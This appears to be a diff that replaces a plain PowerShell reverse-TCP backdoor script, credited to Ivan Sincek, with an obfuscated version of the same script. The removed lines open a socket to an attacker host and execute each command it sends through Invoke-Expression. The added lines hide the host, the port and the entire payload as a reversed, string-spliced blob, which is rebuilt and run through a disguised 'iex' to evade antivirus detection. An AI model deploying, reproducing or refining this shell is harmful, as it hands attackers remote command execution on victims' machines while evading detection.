@@ -1,68 +1,73 @@
-Write-Host "########################################################################";
-Write-Host "#                                                                      #";
-Write-Host "#                        PowerShell Reverse TCP                        #";
-Write-Host "#                                          by Ivan Sincek              #";
-Write-Host "#                                                                      #";
-Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
-Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
-Write-Host "#                                                                      #";
-Write-Host "########################################################################";
-$client = $null;
-$stream = $null;
-$buffer = $null;
-$writer = $null;
-$data = $null;
-$result = $null;
-try {
-	# change the host address and/or port number as necessary
-	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
-	$stream = $client.GetStream();
-	$buffer = New-Object Byte[] 1024;
-	$encoding = New-Object Text.AsciiEncoding;
-	$writer = New-Object IO.StreamWriter($stream);
-	$writer.AutoFlush = $true;
-	Write-Host "Backdoor is up and running...";
-	$bytes = 0;
-	do {
-		$writer.Write("PS>");
-		do {
-			$bytes = $stream.Read($buffer, 0, $buffer.Length);
-			if ($bytes -gt 0) {
-				$data = $data + $encoding.GetString($buffer, 0, $bytes);
-			}
-		} while ($stream.DataAvailable);
-		if ($data.Length -gt 0) {
-			try {
-				$result = Invoke-Expression -Command $data 2>&1 | Out-String;
-			} catch {
-				$result = $_.Exception.InnerException.Message;
-			}
-			$writer.WriteLine($result);
-			Clear-Variable -Name "data";
-		}
-	} while ($bytes -gt 0);
-} catch {
-	Write-Host $_.Exception.InnerException.Message;
-} finally {
-	if ($writer -ne $null) {
-		$writer.Close();
-		$writer.Dispose();
-	}
-	if ($stream -ne $null) {
-		$stream.Close();
-		$stream.Dispose();
-	}
-	if ($client -ne $null) {
-		$client.Close();
-		$client.Dispose();
-	}
-	if ($buffer -ne $null) {
-		$buffer.Clear();
-	}
-	if ($data -ne $null) {
-		Clear-Variable -Name "data";
-	}
-	if ($result -ne $null) {
-		Clear-Variable -Name "result";
-	}
+# change the host address and/or port number as necessary
+# obfuscated host address, same as $a = "127.0.0.1";
+$a = "192" + "." + "168" + "." + "101" + "." + "165";
+# obfuscated port number, same as $p = 9000;
+$p = 1000 + 1000 + 1000 + 6000;
+sET  M6sV  (  [cHaR[ ]]")'x'+]43[eMoHSp$+]4[EmoHSP$ ( .| )93]RAhC[,)07]RAhC[+47]RAhC[+201]RAhC[(  ecALpeR- 43]RAhC[,)211]RAhC[+66]RAhC[+67]RAhC[(ecAlpErc- 421]RAhC[,'tnj' ecAlpErc- 69]RAhC[,)58]RAhC[+57]RAhC[+611]RAhC[( ecAlpErc- 63]RAhC[,'HOD'  ecALpeR-)'
 }
+}
+;pBLrpBL emaN'+'- )*aV-r* MUKtCUKtGUKt( &
+{ )llunHOD en- rHOD( fi '+'
+'+'}
+;pBLdpBL emaN- )*aV-r*'+' MUKtCUKtGUKt( &
+{ )llunHOD en- dHOD( fi
+}
+;)(raelC.bH'+'OD
+{ )llunHOD en- bHOD( fi
+}'+'
+;)(esopsiD.cHOD
+;'+')(esolC.cHOD
+'+'{ )llunHOD en- cHOD( fi
+}
+;)(esopsiD.tHOD
+;)(esolC'+'.tHOD
+{ )llunHOD en- tHOD( fi
+}
+;)(esopsiD.wHOD
+;)(esolC.wHOD
+{ )llunHOD en- wHOD( fi
+{ yll'+'anif }
+;egasseM.noitpecx'+'ErennI.noitpecxE._HOD )??o'+'H-e* MUKtCUKtGUKt'+'( &
+{ hctac }
+;'+')0 tg- ybHOD( e'+'lihw }
+}       '+'
+;pBLdpBL emaN- )*aV-r* MUKtCUKtGUKt( &
+'+';)rH'+'OD(eniLetirW.wHOD
+}
+;noitpecxE._HOD = rHOD                          '+'
+{ h'+'ctac }
+;)?????S-tu'+'* MUKtCUKtGUKt( & tnj 1&>2 dHOD dnammoC- )*E-ek* MUKtCUKtGUKt'+'( & = rHOD
+{ y'+'rt
+{ )0 tg- htgneL.dHOD( fi'+'
+;)elbaliavAataD.tHOD( elihw }
+}
+;)ybHOD ,0 ,bHOD(gnirtSteG.eHOD + dHOD = dHOD
+{ )'+'0 tg-'+' ybHOD( fi
+;)'+'htgneL.bHOD ,0 ,bHOD(daeR.tHOD = ybHOD
+{ od
+;)pBL>SPpBL(etirW.wHOD
+{ od
+;0'+' = ybHOD   '+'
+;pBL...gninnur dna pu si roodkcaBpBL )?'+'?oH-e* MUKtCUKtGUKt( &
+;eur'+'tHOD = hs'+'ulFotuA.wHOD
+;)FJf)tHOD(RUKtEUKtTUKtI'+'UKtRUKtWUKtM'+'UKtAUKtEUKtRUKtTUKtSUKt.UKtOUKtIUKt )*O-we* MUKtCUKtGUKt( &FJf )*E'+'-e'+'k* MUKtCUKtG'+'UKt( &( = wHOD
+;gnidocnEiicsA.txeT )*O-we* MUKtCUKtGUKt( &'+' = eHOD
+;'+')21 + 21 + 000'+'1( ][etyB )*O-we* MUKtCUKtGUKt( &'+' = bHOD
+;)(maertSteG.cHOD = t'+'HOD
+;)FJf)pHOD ,aHOD(TUKtNUK'+'tEUKtIUKtLUKtCUKtPUKtCUKtTUKt.UKtSUKtTUKtEUKtKUKtCUKtOUKtSUK'+'t.U'+'KtTUKtEUKtNUKt )*O-w'+'e* MUKtCUKtGUKt( &FJf )*E-ek* MUKtCUKtGUKt( &( = cHOD
+{ yrt
+'+';llunHOD = rHOD'+'
+;llunHOD = dHOD
+;llunHOD = wHOD
+;llunHOD = bHOD
+;llunHOD = tHOD
+;llunHOD = cHOD
+;pB'+'L#######################'+'########################'+'###'+'######################pBL )??oH-e* MU'+'KtCUKtGUKt( &
+;pBL#  '+'  '+'    '+'                                '+'                              #pBL )??oH-e* MUKtCUKtGUKt( &
+;pBL#   .41Y6qtzgpL6M4uXfnbabv8NR9G7T6MZrB1 ta n'+'ioc'+'tib etanod ot eerf leeF #pBL )??oH-e* MUK'+'tCUKtGUKt( &
+;pBL#  .pct-esrever-llehsrewop/'+'kecnis-navi/moc.buhtig ta yrotisoper buHtiG #pBL )?'+'?oH-e* MUKtCUKtG'+'UKt( &
+;pBL#                          '+'                                            #pBL )??oH-e* MUKtCUKtGUKt( &
+;pBL#              kecniS navI yb '+'            '+'   '+'                          #pBL )??oH-e* '+'MUKtCUKtGUKt( &
+;pBL#                        P'+'CT esreveR llehSrewoP       '+'                 #pBL )??'+'oH-e* MUKtCUKtGUKt( &
+;pBL#                           '+'                                           #pBL )??oH-e* MUKtCUKt'+'GUKt( &
+;pBL#############################################'+'#################'+'##########pBL'+' )??oH-e* MUKtCUKtGUKt( &'((");[aRRAY]::rEvERse( $M6sV);& ((VariAblE '*mdR*').NAME[3,11,2]-joiN'') ( [StriNG]::JOIn('',$M6sV ));
